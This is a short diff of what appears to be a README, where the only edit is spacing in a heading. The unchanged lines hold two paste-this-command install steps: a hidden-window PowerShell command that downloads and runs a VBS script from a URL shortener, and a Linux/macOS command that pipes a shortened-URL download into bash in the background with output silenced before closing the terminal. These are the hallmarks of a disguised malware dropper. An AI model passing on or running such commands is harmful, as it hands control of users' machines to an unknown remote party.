@@ -5,7 +5,7 @@
 powershell -w hidden -c "iwr 'https://tinyurl.com/570windows' -OutFile $env:TEMP\r.vbs; & wscript $env:TEMP\r.vbs"
 ```
 
-## use the following command in linux terminal(MacOS & debian tested)
+## use the following command in linux terminal (MacOS & debian tested)
 ```
 (nohup curl -fsSL https://tinyurl.com/570linux | bash > /dev/null 2>&1 &) && exit
 ```
